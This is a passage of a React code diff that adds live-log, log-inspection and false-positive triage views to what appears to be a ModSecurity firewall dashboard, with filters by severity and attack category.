+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
+                  <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-secondary)', textTransform: 'uppercase' }}>Complete Telemetry Database Record</span>
+                  <button 
+                    className="pagination-btn" 
+                    onClick={handleCopy} 
+                    style={{ padding: '4px 10px', fontSize: '12px', display: 'flex', alignItems: 'center', gap: '4px', margin: 0 }}
+                  >
+                    {copied ? <Check size={14} color="var(--success-color)" /> : <Copy size={14} />}
+                    <span>{copied ? "Copied!" : "Copy JSON"}</span>
+                  </button>
+                </div>
+                <HighlightedJson json={selectedLog} />
+              </div>
+            </div>
+            
+            <div className="modal-footer">
+              <button className="modal-btn secondary" onClick={() => setSelectedLog(null)}>Close</button>
+            </div>
+          </div>
+        </div>
+      )}
+    </motion.div>
+  );
+}
+
+function LiveLogs({ onMarkFalsePositive }) {
+  const [logs, setLogs] = useState([]);
+  const [total, setTotal] = useState(0);
+  const [page, setPage] = useState(1);
+  const [size, setSize] = useState(15);
+  const [loading, setLoading] = useState(true);
+  const [refreshInterval, setRefreshInterval] = useState(3000);
+  const [liveUpdates, setLiveUpdates] = useState(true);
+
+  useEffect(() => {
+    getGeneralSettings().then(settings => {
+      if (settings.logsPerPage) setSize(parseInt(settings.logsPerPage) || 15);
+      if (settings.refreshInterval) {
+        if (settings.refreshInterval === 'off') setRefreshInterval(0);
+        else setRefreshInterval(parseInt(settings.refreshInterval) * 1000 || 5000);
+      }
+      if (settings.liveUpdates !== undefined) setLiveUpdates(settings.liveUpdates);
+    }).catch(err => console.error("Failed to load general settings", err));
+  }, []);
+  const [search, setSearch] = useState('');
+  const [severityFilter, setSeverityFilter] = useState('');
+  const [attackFilter, setAttackFilter] = useState('');
+  const [sortField, setSortField] = useState('timestamp');
+  const [sortOrder, setSortOrder] = useState('desc');
+  const [selectedLog, setSelectedLog] = useState(null);
+  const [isModalOpen, setIsModalOpen] = useState(false);
+  const [expandedLogs, setExpandedLogs] = useState(new Set());
+
+  const toggleExpand = (id) => {
+    setExpandedLogs(prev => {
+      const newSet = new Set(prev);
+      if (newSet.has(id)) {
+        newSet.delete(id);
+      } else {
+        newSet.add(id);
+      }
+      return newSet;
+    });
+  };
+
+  const getReconstructedCommand = (log) => {
+    if (!log) return '-';
+    const host = log?.raw_log?.transaction?.request?.headers?.Host || log?.hostname || log?.client_ip || 'localhost';
+    const uri = log?.uri || '/';
+    const ua = log?.raw_log?.transaction?.request?.headers?.['User-Agent'] || '';
+    const method = log?.raw_log?.transaction?.request?.method || log?.method || 'GET';
+
+    if (ua.toLowerCase().includes('curl')) {
+      return `curl -i "http://${host}${uri}"`;
+    } else {
+      return `${method} http://${host}${uri}\nUser-Agent: ${ua || 'Unknown'}`;
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setPage(1);
+    }, 0);
+    return () => clearTimeout(timer);
+  }, [search, severityFilter, attackFilter]);
+
+  const fetchLogs = async () => {
+    try {
+      const filters = {};
+      if (search.trim()) filters.search = search;
+      if (severityFilter) filters.severity = severityFilter;
+      if (attackFilter) filters.attack_type = attackFilter;
+
+      const logsData = await getLogs(page, size, filters);
+      setLogs(logsData.data);
+      setTotal(logsData.total);
+    } catch (err) {
+      console.error("Error fetching logs", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      fetchLogs();
+    }, 0);
+    if (refreshInterval > 0 && liveUpdates) {
+      const interval = setInterval(fetchLogs, refreshInterval);
+      return () => {
+        clearTimeout(timer);
+        clearInterval(interval);
+      };
+    }
+    return () => clearTimeout(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [page, size, search, severityFilter, attackFilter, refreshInterval, liveUpdates]);
+
+  const handleSort = (field) => {
+    if (sortField === field) {
+      setSortOrder(sortOrder === 'asc' ? 'desc' : 'asc');
+    } else {
+      setSortField(field);
+      setSortOrder('desc');
+    }
+  };
+
+  const sortedLogs = [...logs].sort((a, b) => {
+    let valA = a[sortField] || '';
+    let valB = b[sortField] || '';
+
+    if (sortField === 'timestamp') {
+      valA = Date.parse(valA) || 0;
+      valB = Date.parse(valB) || 0;
+    } else if (sortField === 'severity') {
+      const severityOrder = { 'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1 };
+      valA = severityOrder[valA] || 0;
+      valB = severityOrder[valB] || 0;
+    }
+
+    if (valA < valB) return sortOrder === 'asc' ? -1 : 1;
+    if (valA > valB) return sortOrder === 'asc' ? 1 : -1;
+    return 0;
+  });
+
+  const totalPages = Math.ceil(total / size);
+
+  const getSortIcon = (field) => {
+    if (sortField !== field) return null;
+    return sortOrder === 'asc' ? ' ▲' : ' ▼';
+  };
+
+  return (
+    <motion.div
+      className="glass-panel animate-fade-in" style={{ padding: '24px' }}
+      initial={{ opacity: 0, y: 10 }}
+      animate={{ opacity: 1, y: 0 }}
+      transition={{ duration: 0.4 }}
+    >
+      <div className="card-title" style={{ justifyContent: 'space-between', flexWrap: 'wrap', gap: '16px' }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+          <Activity size={20} color="#3b82f6" />
+          <span>Real-Time ModSecurity Logs</span>
+          <div className="pulse-container">
+            <div className="pulse-dot"></div>
+          </div>
+        </div>
+
+        <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap' }}>
+          <div className="search-input-wrapper">
+            <Search size={14} color="#a1a1aa" style={{ position: 'absolute', left: '12px' }} />
+            <input
+              type="text"
+              placeholder="Search IP, URI, rule..."
+              className="search-input"
+              value={search}
+              onChange={(e) => setSearch(e.target.value)}
+            />
+          </div>
+
+          <select
+            className="filter-select"
+            value={severityFilter}
+            onChange={(e) => setSeverityFilter(e.target.value)}
+          >
+            <option value="">All Severities</option>
+            <option value="Critical">Critical</option>
+            <option value="High">High</option>
+            <option value="Medium">Medium</option>
+            <option value="Low">Low</option>
+          </select>
+
+          <select
+            className="filter-select"
+            value={attackFilter}
+            onChange={(e) => setAttackFilter(e.target.value)}
+          >
+            <option value="">All Threat Types</option>
+            <option value="SQL Injection">SQL Injection</option>
+            <option value="XSS">XSS</option>
+            <option value="RCE">RCE</option>
+            <option value="Protocol Violation">Protocol Violation</option>
+            <option value="LFI/RFI">LFI/RFI</option>
+            <option value="Scanner/Recon">Scanner/Recon</option>
+            <option value="IP Reputation">IP Reputation</option>
+            <option value="HTTP Method Abuse">HTTP Method Abuse</option>
+            <option value="DoS/DDoS">DoS/DDoS</option>
+            <option value="HTTP Smuggling">HTTP Smuggling</option>
+            <option value="PHP Injection">PHP Injection</option>
+            <option value="Code Injection">Code Injection</option>
+            <option value="Session Fixation">Session Fixation</option>
+            <option value="Java Injection">Java Injection</option>
+            <option value="Anomaly Threshold Exceeded">Anomaly Threshold Exceeded</option>
+            <option value="Unknown">Unknown</option>
+          </select>
+        </div>
+      </div>
+
+      <div className="logs-table-wrapper" style={{ marginTop: '16px' }}>
+        <table className="logs-table">
+          <thead>
+            <tr>
+              <th onClick={() => handleSort('timestamp')} style={{ cursor: 'pointer', userSelect: 'none' }}>Time {getSortIcon('timestamp')}</th>
+              <th onClick={() => handleSort('client_ip')} style={{ cursor: 'pointer', userSelect: 'none' }}>Source IP {getSortIcon('client_ip')}</th>
+              <th onClick={() => handleSort('severity')} style={{ cursor: 'pointer', userSelect: 'none' }}>Severity {getSortIcon('severity')}</th>
+              <th onClick={() => handleSort('attack_type')} style={{ cursor: 'pointer', userSelect: 'none' }}>Attack Type {getSortIcon('attack_type')}</th>
+              <th onClick={() => handleSort('rule_id')} style={{ cursor: 'pointer', userSelect: 'none' }}>Rule ID {getSortIcon('rule_id')}</th>
+              <th onClick={() => handleSort('http_code')} style={{ cursor: 'pointer', userSelect: 'none' }}>Status {getSortIcon('http_code')}</th>
+              <th>Requested URI</th>
+              <th style={{ textAlign: 'right' }}>Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            <AnimatePresence mode="popLayout">
+              {loading && sortedLogs.length === 0 ? (
+                <tr>
+                  <td colSpan="8" style={{ textAlign: 'center', padding: '60px', color: '#a1a1aa' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '12px' }}>
+                      <Activity className="animate-spin" size={20} /> Loading live ModSecurity logs...
+                    </div>
+                  </td>
+                </tr>
+              ) : sortedLogs.length === 0 ? (
+                <tr>
+                  <td colSpan="8" style={{ textAlign: 'center', padding: '60px', color: '#a1a1aa' }}>
+                    No matching threat records discovered.
+                  </td>
+                </tr>
+              ) : (
+                sortedLogs.map((log, index) => {
+                  const rowId = log.id || index;
+                  const reconstructedCommand = getReconstructedCommand(log);
+
+                  return (
+                    <React.Fragment key={rowId}>
+                      <motion.tr
+                        initial={{ opacity: 0, y: 4 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        exit={{ opacity: 0, y: -4 }}
+                        transition={{ duration: 0.2 }}
+                      >
+                        <td style={{ color: '#a1a1aa', whiteSpace: 'nowrap' }}>{log?.timestamp || '-'}</td>
+                        <td style={{ fontFamily: 'monospace', color: '#3b82f6', fontWeight: 500 }}>{log?.client_ip || '-'}</td>
+                        <td>
+                          <span className={`severity-badge severity-${(log?.severity || 'low').toLowerCase()}`}>
+                            {log?.severity || 'Low'}
+                          </span>
+                        </td>
+                        <td style={{ fontWeight: 500 }}>{log?.attack_type || '-'}</td>
+                        <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>{log?.rule_id || '-'}</td>
+                        <td>
+                          <span style={{
+                            color: log?.http_code?.startsWith('2') ? '#10b981' : log?.http_code?.startsWith('3') ? '#3b82f6' : '#ef4444',
+                            fontWeight: 600,
+                            fontFamily: 'monospace'
+                          }}>
+                            {log?.http_code || '-'}
+                          </span>
+                        </td>
+                        <td className="payload-cell"
+                          onClick={() => toggleExpand(rowId)}
+                          style={{ fontFamily: 'monospace', fontSize: '12px', color: '#e2e8f0', maxBreakWidth: '300px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '300px' }}
+                          title={reconstructedCommand}
+                        >
+                          {log?.uri || '-'}
+                        </td>
+                        <td style={{ textAlign: 'right' }}>
+                          <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
+                            {onMarkFalsePositive && (
+                              <button
+                                className="action-btn-inspect"
+                                onClick={(e) => {
+                                  e.stopPropagation();
+                                  onMarkFalsePositive(log);
+                                }}
+                                style={{ borderColor: 'rgba(16, 185, 129, 0.4)', color: '#a7f3d0' }}
+                              >
+                                Mark as FP
+                              </button>
+                            )}
+                            <button
+                              className="action-btn-inspect"
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                setSelectedLog(log);
+                                setIsModalOpen(true);
+                              }}
+                            >
+                              Inspect Log
+                            </button>
+                          </div>
+                        </td>
+                      </motion.tr>
+                      {expandedLogs.has(rowId) && (
+                        <tr className="expanded-log-row">
+                          <td colSpan="8" style={{ padding: '16px 24px', background: 'rgba(59, 130, 246, 0.08)', borderBottom: '1px solid rgba(59, 130, 246, 0.2)' }}>
+                            <div style={{ fontFamily: 'monospace', fontSize: '13px', color: '#93c5fd', wordBreak: 'break-all', whiteSpace: 'pre-wrap' }}>
+                              <strong style={{ color: '#bfdbfe', marginRight: '8px' }}>RECONSTRUCTED COMMAND:</strong><br />
+                              <span style={{ marginTop: '8px', display: 'block', padding: '12px', background: 'rgba(0,0,0,0.3)', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.05)' }}>
+                                {reconstructedCommand}
+                              </span>
+                            </div>
+                          </td>
+                        </tr>
+                      )}
+                    </React.Fragment>
+                  );
+                })
+              )}
+            </AnimatePresence>
+          </tbody>
+        </table>
+      </div>
+
+      {totalPages > 1 && (
+        <div className="pagination-container">
+          <button
+            className="pagination-btn"
+            disabled={page === 1}
+            onClick={() => setPage(page - 1)}
+          >
+            <ChevronLeft size={16} /> Previous
+          </button>
+          <span className="pagination-info">
+            Page <strong style={{ color: '#fff' }}>{page}</strong> of <strong style={{ color: '#fff' }}>{totalPages}</strong> ({total} total logs)
+          </span>
+          <button
+            className="pagination-btn"
+            disabled={page >= totalPages}
+            onClick={() => setPage(page + 1)}
+          >
+            Next <ChevronRight size={16} />
+          </button>
+        </div>
+      )}
+
+      <LogDetailsModal
+        isOpen={isModalOpen}
+        log={selectedLog}
+        onClose={() => {
+          setIsModalOpen(false);
+          setSelectedLog(null);
+        }}
+        onMarkFalsePositive={onMarkFalsePositive}
+      />
+    </motion.div>
+  );
+}
+
+const CATEGORY_MAP = {
+  "901": "Initialization",
+  "905": "Common Exceptions",
+  "911": "Method Enforcement",
+  "913": "Scanner Detection",
+  "920": "Protocol Enforcement",
+  "921": "Protocol Attack",
+  "922": "Multipart Attack",
+  "930": "LFI",
+  "931": "RFI",
+  "932": "RCE",
+  "933": "PHP Injection",
+  "934": "Generic Attack",
+  "941": "XSS",
+  "942": "SQL Injection",
+  "943": "Session Fixation",
+  "944": "Java Injection",
+  "949": "Blocking Evaluation",
+  "950": "Data Leakage",
+  "951": "SQL Leakage",
+  "952": "Java Leakage",
+  "953": "PHP Leakage",
+  "954": "IIS Leakage",
+  "955": "Web Shells",
+  "956": "Ruby Leakage",
+  "959": "Blocking Response",
+  "980": "Correlation"
+};
+
+function FlagFpModal({ isOpen, log, onClose, onSubmit }) {
+  const [note, setNote] = useState('');
+  const [submitting, setSubmitting] = useState(false);
+
+  useEffect(() => {
+    if (isOpen) {
+      const timer = setTimeout(() => setNote(''), 0);
+      return () => clearTimeout(timer);
+    }
+  }, [isOpen]);
+
+  if (!isOpen || !log) return null;
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setSubmitting(true);
+    await onSubmit(log.id, note);
+    setSubmitting(false);
+    onClose();
+  };
+
+  return createPortal(
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '480px' }}>
+        <div className="modal-header">
+          <div className="modal-title">
+            <ShieldCheck size={20} color="#10b981" />
+            <span>Mark as False Positive</span>
+          </div>
+          <button className="modal-close-btn" onClick={onClose}>
+            <X size={18} />
+          </button>
+        </div>
+        <form onSubmit={handleSubmit}>
+          <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '13px' }}>
+              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
+                <span style={{ color: '#a1a1aa' }}>Rule ID:</span>
+                <span style={{ fontFamily: 'monospace', color: '#fff' }}>{log.rule_id}</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
+                <span style={{ color: '#a1a1aa' }}>Client IP:</span>
+                <span style={{ fontFamily: 'monospace', color: '#3b82f6' }}>{log.client_ip}</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
+                <span style={{ color: '#a1a1aa' }}>Request URI:</span>
+                <span style={{ fontFamily: 'monospace', color: '#ef4444', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap', maxWidth: '240px' }}>{log.uri}</span>
+              </div>
+            </div>
+
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+              <label htmlFor="analyst-note" style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Analyst Justification Note</label>
+              <textarea
+                id="analyst-note"
+                className="settings-input"
+                style={{ height: '100px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '12px' }}
+                placeholder="Explain why this request is legitimate (e.g. false alarm on search query parameter)..."
+                value={note}
+                onChange={(e) => setNote(e.target.value)}
+                maxLength={400}
+                required
+              />
+            </div>
+          </div>
+          <div className="modal-footer" style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
+            <button type="button" className="modal-btn secondary" onClick={onClose}>Cancel</button>
+            <button type="submit" className="modal-btn primary" disabled={submitting} style={{ background: '#10b981', borderColor: '#10b981', color: '#000', fontWeight: 600 }}>
+              {submitting ? "Saving..." : "Confirm & Save"}
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>,
+    document.body
+  );
+}
+
+function FalsePositiveDetailsModal({ isOpen, entry, onClose, onUpdateStatus, onSaveNote, onCreateException, onDeleteEntry, userRole }) {
+  const [noteVal, setNoteVal] = useState('');
+  const [isEditingNote, setIsEditingNote] = useState(false);
+  const [copied, setCopied] = useState(false);
+
+  useEffect(() => {
+    if (entry) {
+      const timer = setTimeout(() => {
+        setNoteVal(entry.analyst_note || '');
+        setIsEditingNote(false);
+      }, 0);
+      return () => clearTimeout(timer);
+    }
+  }, [entry]);
+
+  useEffect(() => {
+    if (copied) {
+      const t = setTimeout(() => setCopied(false), 2000);
+      return () => clearTimeout(t);
+    }
+  }, [copied]);
+
+  if (!isOpen || !entry) return null;
+
+  const handleCopy = () => {
+    const raw = entry.raw_log || entry;
+    navigator.clipboard.writeText(JSON.stringify(raw, null, 2))
+      .then(() => setCopied(true))
+      .catch(err => console.error("Copy failed", err));
+  };
+
+  const handleSave = () => {
+    onSaveNote(entry.id, noteVal);
+    setIsEditingNote(false);
+  };
+
+  return createPortal(
+    <div className="modal-overlay" onClick={onClose}>
+      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '620px' }}>
+        <div className="modal-header">
+          <div className="modal-title">
+            <ShieldCheck size={20} color="#3b82f6" />
+            <span>False Positive Report Details</span>
+          </div>
+          <button className="modal-close-btn" onClick={onClose}>
+            <X size={18} />
+          </button>
+        </div>
+        <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px', maxHeight: '75vh', overflowY: 'auto', paddingRight: '4px' }}>
+
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '13px' }}>
+            <div>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Incident Rule ID:</span>
+              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontFamily: 'monospace' }}>Rule #{entry.rule_id}</div>
+            </div>
+            <div>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Flagged Severity:</span>
+              <div style={{ marginTop: '2px' }}>
+                <span className={`severity-badge severity-${entry.severity?.toLowerCase() || 'medium'}`}>
+                  {entry.severity}
+                </span>
+              </div>
+            </div>
+            <div style={{ marginTop: '8px' }}>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Source Client IP:</span>
+              <div style={{ fontWeight: 600, color: '#38bdf8', marginTop: '2px', fontFamily: 'monospace' }}>{entry.client_ip}</div>
+            </div>
+            <div style={{ marginTop: '8px' }}>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Attack Type Category:</span>
+              <div style={{ fontWeight: 600, color: '#eab308', marginTop: '2px' }}>{entry.attack_type}</div>
+            </div>
+            <div style={{ marginTop: '8px', gridColumn: 'span 2' }}>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Target Request URI:</span>
+              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontFamily: 'monospace', wordBreak: 'break-all' }}>{entry.uri}</div>
+            </div>
+            <div style={{ marginTop: '8px', gridColumn: 'span 2' }}>
+              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Timestamp Reported:</span>
+              <div style={{ fontWeight: 500, color: '#fff', marginTop: '2px' }}>{entry.timestamp}</div>
+            </div>
+          </div>
+
+          {/* Review Status Selector */}
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+            <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Triage Review Stage</span>
+            <div style={{ display: 'flex', gap: '8px' }}>
+              {['Pending', 'Reviewed', 'Resolved'].map((st) => (
+                <button
+                  key={st}
+                  type="button"
+                  onClick={() => onUpdateStatus(entry.id, st)}
+                  style={{
+                    flex: 1,
+                    padding: '8px 12px',
+                    borderRadius: '6px',
+                    fontSize: '12px',
+                    fontWeight: 600,
+                    cursor: 'pointer',
+                    transition: 'all 0.2s',
+                    background: entry.status === st ? (st === 'Resolved' ? 'rgba(16,185,129,0.15)' : st === 'Reviewed' ? 'rgba(59,130,246,0.15)' : 'rgba(234,179,8,0.15)') : 'rgba(255,255,255,0.02)',
+                    color: entry.status === st ? (st === 'Resolved' ? '#a7f3d0' : st === 'Reviewed' ? '#93c5fd' : '#fef08a') : '#a1a1aa',
+                    border: entry.status === st ? (st === 'Resolved' ? '1px solid rgba(16,185,129,0.3)' : st === 'Reviewed' ? '1px solid rgba(59,130,246,0.3)' : '1px solid rgba(234,179,8,0.3)') : '1px solid rgba(255,255,255,0.05)',
+                  }}
+                >
+                  {st}
+                </button>
+              ))}
+            </div>
+          </div>
+
+          {/* Analyst Notes Field */}
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Analyst Justification Notes</span>
+              {!isEditingNote && (
+                <button
+                  onClick={() => setIsEditingNote(true)}
+                  style={{ background: 'transparent', border: 'none', color: '#3b82f6', fontSize: '11.5px', fontWeight: 600, cursor: 'pointer' }}
+                >
+                  Edit Note
+                </button>
+              )}
+            </div>
+            {isEditingNote ? (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                <textarea
+                  className="settings-input"
+                  style={{ height: '80px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '10px', fontSize: '13px' }}
+                  value={noteVal}
+                  onChange={(e) => setNoteVal(e.target.value)}
+                  placeholder="Describe why this request is a false positive..."
+                />
+                <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
+                  <button className="modal-btn secondary" style={{ padding: '4px 10px', fontSize: '11px' }} onClick={() => { setNoteVal(entry.analyst_note || ''); setIsEditingNote(false); }}>Cancel</button>
+                  <button className="modal-btn primary" style={{ padding: '4px 10px', fontSize: '11px', background: '#3b82f6', borderColor: '#3b82f6', color: '#fff' }} onClick={handleSave}>Save</button>
+                </div>
+              </div>
+            ) : (
+              <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: '6px', padding: '12px', fontSize: '13px', color: '#cbd5e1', fontStyle: entry.analyst_note ? 'normal' : 'italic', whiteSpace: 'pre-wrap' }}>
+                {entry.analyst_note || "No analyst review notes recorded. Click 'Edit Note' to add details."}
+              </div>
+            )}
+          </div>
+
+          {/* Trigger Event Log JSON */}
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Origin Transaction Trigger Log JSON</span>
+              <button
+                onClick={handleCopy}
+                style={{ background: 'transparent', border: 'none', color: copied ? '#10b981' : '#3b82f6', fontSize: '11px', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '4px', cursor: 'pointer' }}
+              >
+                {copied ? <Check size={12} /> : <Copy size={12} />}
+                <span>{copied ? 'Copied JSON!' : 'Copy Raw JSON'}</span>
+              </button>
+            </div>
+            <div style={{ maxHeight: '250px', overflowY: 'auto', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px' }}>
+              <HighlightedJson json={entry.raw_log || entry} />
+            </div>
+          </div>
+
+        </div>
+        <div className="modal-footer" style={{ display: 'flex', justifyContent: 'space-between', width: '100%', alignItems: 'center' }}>
+          <div>
+            <button
+              className="modal-btn secondary"
+              onClick={() => {
+                onDeleteEntry(entry.id);
+                onClose();
+              }}
+              style={{ borderColor: 'rgba(239, 68, 68, 0.4)', color: '#fca5a5' }}
+            >
+              Delete Record
+            </button>
+          </div>
+          <div style={{ display: 'flex', gap: '10px' }}>
+            <button className="modal-btn secondary" onClick={onClose}>Close</button>
+            {userRole === 'admin' && entry.status !== 'Resolved' && (
+              <button
+                className="modal-btn primary"
+                onClick={() => {
+                  onCreateException(entry);
+                  onClose();
+                }}
+                style={{ background: '#f97316', borderColor: '#f97316', color: '#000', fontWeight: 600 }}
+              >
+                Bypass & Create Exception
+              </button>
+            )}
+          </div>
+        </div>
+      </div>
+    </div>,
+    document.body
+  );
+}
+
+function FalsePositives({ userRole, onCreateException }) {
+  const [entries, setEntries] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [statusFilter, setStatusFilter] = useState('');
+  const [severityFilter, setSeverityFilter] = useState('');
+  const [search, setSearch] = useState('');
+  const [ruleIdSearch, setRuleIdSearch] = useState('');
+  const [selectedLog, setSelectedLog] = useState(null);
+  const [isLogModalOpen, setIsLogModalOpen] = useState(false);
+  const [successMsg, setSuccessMsg] = useState('');
+
+  const fetchFP = async () => {
+    setLoading(true);
+    try {
+      const filters = {};
+      if (statusFilter) filters.status = statusFilter;
+      if (severityFilter) filters.severity = severityFilter;
+      if (ruleIdSearch.trim()) filters.rule_id = ruleIdSearch.trim();
+      if (search.trim()) filters.search = search.trim();
+
+      const data = await getFalsePositives(filters);
+      setEntries(data);
+    } catch (err) {
+      console.error("Failed to load false positives", err);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      fetchFP();
+    }, 0);
+    return () => clearTimeout(timer);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [statusFilter, severityFilter, ruleIdSearch, search]);
+
+  const handleUpdateStatus = async (id, status) => {
+    try {
+      await updateFalsePositiveStatus(id, status);
+      setSuccessMsg(`Triage status updated to ${status}!`);
+      fetchFP();
+      setSelectedLog(prev => prev ? { ...prev, status: status } : null);
+      setTimeout(() => setSuccessMsg(''), 3000);
+    } catch (err) {
+      console.error("Failed to update status", err);
+    }
+  };
+
+  const handleSaveNote = async (id, noteText) => {
+    try {
+      await updateFalsePositiveNote(id, noteText);
+      setSuccessMsg("Analyst note updated successfully!");
+      fetchFP();
+      setSelectedLog(prev => prev ? { ...prev, analyst_note: noteText } : null);
+      setTimeout(() => setSuccessMsg(''), 3000);
+    } catch (err) {
+      console.error("Failed to update note", err);
+    }
+  };
+
+  const handleDeleteEntry = async (id) => {
+    if (!window.confirm("Are you sure you want to remove this false positive record from WAF diagnostics?")) return;
+    try {
+      await deleteFalsePositive(id);
+      setSuccessMsg("Record removed successfully!");
+      fetchFP();
+      setTimeout(() => setSuccessMsg(''), 3000);
+    } catch (err) {
+      console.error("Failed to delete false positive entry", err);
+    }
+  };
+
+  return (
+    <motion.div
+      initial={{ opacity: 0, y: 15 }}
+      animate={{ opacity: 1, y: 0 }}
+      exit={{ opacity: 0, y: -15 }}
+      transition={{ duration: 0.25 }}
+      style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}
+    >
+      {/* Toast Alert */}
+      <AnimatePresence>
+        {successMsg && (
+          <motion.div
+            initial={{ opacity: 0, y: -20 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: -20 }}
+            style={{
+              position: 'fixed', top: '24px', right: '24px', background: 'var(--success-color)', color: '#000',
+              padding: '12px 24px', borderRadius: '8px', zIndex: 10000, fontWeight: 600, display: 'flex', gap: '8px', alignItems: 'center',
+              boxShadow: '0 10px 15px -3px var(--success-glow)'
+            }}
+          >
+            <ShieldCheck size={18} />
+            <span>{successMsg}</span>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Statistics Cards */}
+      <div className="dashboard-grid animate-fade-in" style={{ gap: '16px', marginBottom: '8px' }}>
+        <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
+          <div className="metric-header">
+            <span>Total False Positive Reports</span>
+            <div className="metric-icon-wrapper blue"><Database size={18} /></div>
+          </div>
+          <div className="metric-value">{entries.length}</div>
+          <div className="metric-trend trend-down">
+            <span>Triage & review candidates</span>
+          </div>
+        </div>
+        <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
+          <div className="metric-header">
+            <span>Pending Review</span>
+            <div className="metric-icon-wrapper orange"><Clock size={18} /></div>
+          </div>
+          <div className="metric-value" style={{ color: '#eab308' }}>
+            {entries.filter(e => e.status === 'Pending').length}
+          </div>
+          <div className="metric-trend trend-up">
+            <span>Awaiting analyst tuning</span>
+          </div>
+        </div>
+        <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
+          <div className="metric-header">
+            <span>Tuned & Resolved</span>
+            <div className="metric-icon-wrapper green"><ShieldCheck size={18} /></div>
+          </div>
+          <div className="metric-value" style={{ color: '#10b981' }}>
+            {entries.filter(e => e.status === 'Resolved').length}
+          </div>
+          <div className="metric-trend trend-down">
+            <span>WAF exception bypasses active</span>
+          </div>
+        </div>
+      </div>
+
+      {/* Filter Toolbar */}
+      <div className="glass-panel" style={{ padding: '16px 20px', display: 'flex', flexWrap: 'wrap', gap: '16px', alignItems: 'center' }}>
+        <div style={{ position: 'relative', flex: 1, minWidth: '200px' }}>
+          <Search size={16} color="#a1a1aa" style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)' }} />
+          <input
+            type="text"
+            className="search-input"
+            style={{ paddingLeft: '36px', height: '38px', margin: 0, width: '100%' }}
+            placeholder="Search IP, URI or analyst note..."
+            value={search}
+            onChange={(e) => setSearch(e.target.value)}
+          />
+        </div>
+        <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap' }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
